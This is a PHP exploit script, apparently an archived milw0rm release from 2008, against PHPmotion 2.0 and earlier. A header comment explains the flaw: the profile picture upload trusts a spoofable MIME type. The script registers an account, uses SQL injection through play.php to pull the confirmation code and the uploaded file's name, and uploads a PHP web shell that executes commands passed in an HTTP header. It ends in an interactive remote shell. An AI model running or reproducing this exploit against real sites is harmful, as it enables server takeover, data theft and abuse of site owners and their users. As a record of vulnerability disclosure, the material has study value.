<?php

/*
	-----------------------------------------------------------------
	PHPmotion <= 2.0 (update_profile.php) Remote Shell Upload Exploit
	-----------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.phpmotion.com/
	details..: don't works on windows platforms due to $_FILES['ufile']['tmp_name'] is stripslashed

	[-] vulnerable code in /update_profile.php
	
	255.	    // START OF FILE UPLOAD AND SECURITY CHECK
	256.	    $limit_size = $config['maximum_size'];//you can change this to a higher file size limit (this is in bytes = 2MB apprx)
	257.	    $random = randomcode();//create random number
	258.	    $uniquename1 = $random . $_FILES['ufile']['name'];//add random number to file name to create unique file
	259.	    $uniquename = mysql_real_escape_string($uniquename1);
	260.	    $path = installation_paths();
	261.	    $path = $path . "/pictures/" . $uniquename;
	262.	
	263.	    if ($_FILES) {
	264.	        // Store upload file size in $file_size
	265.	        $file_size = $_FILES['ufile']['size'];
	266.			//die("\$file_size = $file_size; \$limit_size = $limit_size;");
	267.	
	268.	        if ($file_size >= $limit_size) {
	269.	            // Display file size error
	270.	            // ///////////////////////
	271.	            $show = 1;
	272.	            $message_type = $config["notification_success"];//the messsage displayed at the top coner
	273.	            $error_message = 'Your image is too large. The maximum size allowed is: ' . $config['maximum_size_human_readale'];
	274.	            $blk_id = 1;//html table - error block
	275.	            $template = "templates/main_1.htm";
	276.	            $inner_template1 = "templates/inner_myaccount_update_profile.htm";//middle of page
	277.	            $TBS = new clsTinyButStrong;
	278.	            $TBS->NoErr = true;// no more error message displayed.
	279.	            $TBS->LoadTemplate("$template");
	280.	            $TBS->Render = TBS_OUTPUT;
	281.	            $TBS->Show();
	282.	            
	283.	            @mysql_close();
	284.	            die();
	285.	        }
	286.	        else {
	287.	            $filetype = $_FILES['ufile']['type']; <=======
	288.	            if ($filetype == "image/gif" || $filetype == "image/jpeg" || $filetype ==
	289.	                "image/pjpeg") {
	290.	                // copy file to where you want to store file
	291.	                if (@copy($_FILES['ufile']['tmp_name'], $path)) {
	292.	                }
	293.	                else {
	294.	                    // Display general file copy error
	
	an attacker might be able to upload arbitrary malicious files with .php extension due to the code
	near lines 287-289 will check only the MIME type of the upload request, that can be easily spoofed!
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

// yes, SQL injection vulnerable too!
function retrive_data($field, $table, $clause)
{
	global $host, $path;
	
	$sql = "-1/**/UNION/**/SELECT/**/".str_repeat("1,",16)."{$field},".encodeSQL("yes").",1,1,1/**/FROM/**/{$table}/**/WHERE/**/{$clause}%23";

	$packet  = "GET {$path}play.php?vid={$sql} HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Connection: close\r\n\r\n";

	preg_match("/play.php\?vid=(.*)\"/", http_send($host, $packet), $match);
	return $match[1];
}

function encodeSQL($sql)
{
	for ($i = 0, $n = strlen($sql); $i < $n; $i++) $encoded .= dechex(ord($sql[$i]));
	return "CONCAT(0x{$encoded})";
}

function upload()
{
	global $host, $path, $sid, $username;

	login();
	
	print "[-] Trying to upload a shell...\n";
	
	$payload  = "--o0oOo0o\r\n";
	$payload .= "Content-Disposition: form-data; name=\"submitted_pic\"\r\n\r\nyes\r\n";
	$payload .= "--o0oOo0o\r\n";
	$payload .= "Content-Disposition: form-data; name=\"ufile\"; filename=\".php\"\r\n";
	$payload .= "Content-Type: image/jpeg\r\n\r\n";
	$payload .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\r\n";
	$payload .= "--o0oOo0o--\r\n";
	
	$packet  = "POST {$path}update_profile.php HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Cookie: PHPSESSID={$sid}\r\n";
	$packet .= "Content-Length: ".strlen($payload)."\r\n";
	$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
	$packet .= "Connection: close\r\n\r\n";
	$packet .= $payload;

	http_send($host, $packet);
	
	$user_id = (int) retrive_data("user_id", "member_profile", "user_name=".encodeSQL($username));
	$file_name = retrive_data("file_name", "pictures", "user_id={$user_id}");
	
	if (!isset($file_name)) die("\n[-] Upload failed...\n");
	else return $file_name;
}

function login()
{
	global $host, $path, $username, $password, $sid;
	
	print "\n[-] Logging in with username '{$username}' and password '{$password}'\n";
	
	$data	= "user_name_login={$username}&password_login={$password}&submitted=yes";
	$packet = "POST {$path}login.php HTTP/1.0\r\n";
	$packet.= "Host: {$host}\r\n";
	$packet.= "Content-Length: ".strlen($data)."\r\n";
	$packet.= "Content-Type: application/x-www-form-urlencoded\r\n";
	$packet.= "Connection: close\r\n\r\n";
	$packet.= $data;
	$html	= http_send($host, $packet);
	
	preg_match("/PHPSESSID=([0-9a-f]{32})/i", $html, $match);
	$sid = $match[1];
	
	if (!preg_match("/Location: myaccount.php/i", $html))
	{
		print "[-] Login failed!\n";
		register();
		login();
	}
}

function register()
{
	global $host, $path, $username, $password;
	
	print "\n[-] Registering new user '{$username}' with password '{$password}'\n";
	
	// register a new account
	$data	= "user_name={$username}";
	$data  .= "&password={$password}";
	$data  .= "&confirm_password={$password}";
	$data  .= "&email_address=".md5(time())."@null.com";
	$data  .= "&form_submitted=yes";
	$data  .= "&terms=yes";
	$packet = "POST {$path}register.php HTTP/1.0\r\n";
	$packet.= "Host: {$host}\r\n";
	$packet.= "Content-Length: ".strlen($data)."\r\n";
	$packet.= "Content-Type: application/x-www-form-urlencoded\r\n";
	$packet.= "Connection: close\r\n\r\n";
	$packet.= $data;
	
	http_send($host, $packet);
	
	$code = retrive_data("random_code", "member_profile", "user_name=".encodeSQL($username));
	if (!isset($code)) die("\n[-] Registration failed...\n");
	
	// and confirm the registration
	$packet = "GET {$path}confirm.php?id={$code} HTTP/1.0\r\n";
	$packet.= "Host: {$host}\r\n";
	$packet.= "Connection: close\r\n\r\n";
	
	if (!preg_match("/registration is now complete/i", http_send($host, $packet))) die("\n[-] Registration failed...\n");
}

print "\n+---------------------------------------------------------------------------+";
print "\n| PHPmotion <= 2.0 (update_profile.php) Remote Shell Upload Exploit by EgiX |";
print "\n+---------------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......: php $argv[0] host path\n";
	print "\nExample....: php $argv[0] localhost /";
	print "\nExample....: php $argv[0] localhost /phpmotion/\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

$username = "pr00f_0f";
$password = "_c0nc3pt";

$r_path = "pictures/".upload();

define(STDIN, fopen("php://stdin", "r"));

while(1)
{
	print "\nphpmotion-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet = "GET {$path}{$r_path} HTTP/1.0\r\n";
		$packet.= "Host: {$host}\r\n";
		$packet.= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet.= "Connection: close\r\n\r\n";
		$output = http_send($host, $packet);
		if (!preg_match("/_code_/", $output)) die("\n[-] Exploit failed...\n");
		$shell = explode("_code_", $output);
		print "\n{$shell[1]}";
	}
	else break;
}

?>

# milw0rm.com [2008-06-25]